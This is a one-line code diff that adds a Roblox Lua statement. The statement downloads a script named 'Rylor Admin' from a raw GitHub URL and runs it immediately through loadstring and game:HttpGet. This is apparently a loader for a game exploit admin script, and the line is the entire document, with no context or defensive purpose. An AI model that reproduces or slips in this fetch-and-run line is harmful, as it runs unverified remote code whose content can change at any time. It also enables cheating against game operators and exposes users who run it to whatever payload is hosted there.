@@ -1,0 +1,1 @@
+loadstring(game:HttpGet"https://raw.githubusercontent.com/xkyxal/Michael/main/Rylor%20Admin.txt")()
